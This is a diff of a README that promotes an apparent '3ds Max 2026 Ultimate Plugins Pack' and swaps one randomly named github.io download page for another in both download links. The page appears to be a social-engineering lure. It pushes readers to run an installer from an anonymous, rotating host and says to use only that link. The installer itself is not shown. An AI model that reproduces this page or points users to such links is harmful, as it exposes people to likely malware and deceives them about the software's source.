@@ -2,7 +2,7 @@
 
 Autodesk 3ds Max 2026 Ultimate Plugins Pack is a curated bundle of powerful plugins and scripts designed to supercharge your 3D creation workflow. This pack includes essential tools for modeling, rendering, animation, and more, all optimized for the latest 2026 version. Last Updated: October 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -57,4 +57,4 @@ A: The plugins are designed for efficiency. However, like any additional softwar
 
 The latest version of the installer is always available from our official download page. Please use only this link to ensure you have the authentic and up-to-date file.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
